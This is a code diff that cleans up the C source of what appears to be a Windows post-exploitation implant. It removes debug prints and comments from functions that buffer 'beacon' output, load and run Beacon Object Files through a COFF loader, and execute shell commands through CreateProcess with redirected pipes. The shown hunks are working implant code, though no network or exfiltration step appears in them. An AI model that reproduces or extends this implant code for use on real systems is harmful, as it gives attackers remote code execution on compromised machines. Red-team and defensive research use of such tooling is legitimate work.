@@ -12,38 +12,27 @@
 #define OUTPUT_BUF_SIZE  (256 * 1024)
 #define CMD_BUF_SIZE     4096
 
-// ---------------------------------------------------------------------------
-// Output buffer
-// ---------------------------------------------------------------------------
 static char *beacon_buf     = NULL;
 static int   beacon_buf_pos = 0;
 static int   beacon_buf_cap = 0;
 static char  cwd[MAX_PATH]  = {0};
 
- 
 int shell_init(void) {
-    fprintf(stderr, "[D] shell_init entry\n"); fflush(stderr);
-    fprintf(stderr, "[D] calling CoffLoaderInit\n"); fflush(stderr);
     coff_error_t ci = CoffLoaderInit();
-    fprintf(stderr, "[D] CoffLoaderInit = %d\n", ci); fflush(stderr);
     if (ci != COFF_SUCCESS) return -1;
-    fprintf(stderr, "[D] calloc\n"); fflush(stderr);
     beacon_buf = calloc(OUTPUT_BUF_SIZE, 1);
-    fprintf(stderr, "[D] calloc done %p\n", (void*)beacon_buf); fflush(stderr);
     if (!beacon_buf) return -1;
     beacon_buf_cap = OUTPUT_BUF_SIZE;
     GetCurrentDirectoryA(MAX_PATH, cwd);
-    fprintf(stderr, "[D] shell_init done\n"); fflush(stderr);
     return 0;
 }
-
 
 void shell_cleanup(void) {
     free(beacon_buf);
     beacon_buf     = NULL;
     beacon_buf_pos = 0;
     beacon_buf_cap = 0;
-    CoffLoaderTeardown();  // add this
+    CoffLoaderTeardown();
 }
 
 int shell_output_len(void) {
@@ -62,8 +51,8 @@ void shell_buf_reset(void) {
 void buf_append(const char *data, int len) {
     if (!beacon_buf) return;
     if (beacon_buf_pos + len >= beacon_buf_cap) {
-        const char *msg = "[!] Output buffer full\n";
-        int msglen = (int)strlen(msg);
+        const char *msg    = "[!] Output buffer full\n";
+        int         msglen = (int)strlen(msg);
         if (beacon_buf_pos + msglen < beacon_buf_cap) {
             memcpy(beacon_buf + beacon_buf_pos, msg, msglen);
             beacon_buf_pos += msglen;
@@ -84,20 +73,17 @@ void beacon_log(const char *fmt, ...) {
     if (n > 0) buf_append(tmp, n);
 }
 
-// ---------------------------------------------------------------------------
-// BOF execution
-// ---------------------------------------------------------------------------
 int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_len) {
     coff_error_t result = CoffRunBOF(
         "go",
         (const uint8_t *)bof_data,
         (uint32_t)bof_size,
-        NULL,                          // use default allocator
+        NULL,
         (uint8_t *)args,
         args_len
     );
 
-    int out_size = 0;
+    int   out_size  = 0;
     char *bof_output = BeaconGetOutputData(&out_size);
     if (bof_output && out_size > 0) {
         buf_append(bof_output, out_size);
@@ -107,9 +93,10 @@ int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_l
     return (result == COFF_SUCCESS) ? 0 : 1;
 }
 
-// ---------------------------------------------------------------------------
-// Shell execution
-// ---------------------------------------------------------------------------
+/**
+ * @brief Handle a "cd" command, updating the tracked working directory.
+ * @param target Target path string (empty or "~" goes to USERPROFILE).
+ */
 static void handle_cd(const char *target) {
     char new_path[MAX_PATH];
 
@@ -156,8 +143,8 @@ void execute_shell_command(const char *command) {
     }
 
     STARTUPINFOA si = {0};
-    si.cb        = sizeof(si);
-    si.dwFlags   = STARTF_USESTDHANDLES;
+    si.cb         = sizeof(si);
+    si.dwFlags    = STARTF_USESTDHANDLES;
     si.hStdOutput = hWrite;
     si.hStdError  = hWrite;
 
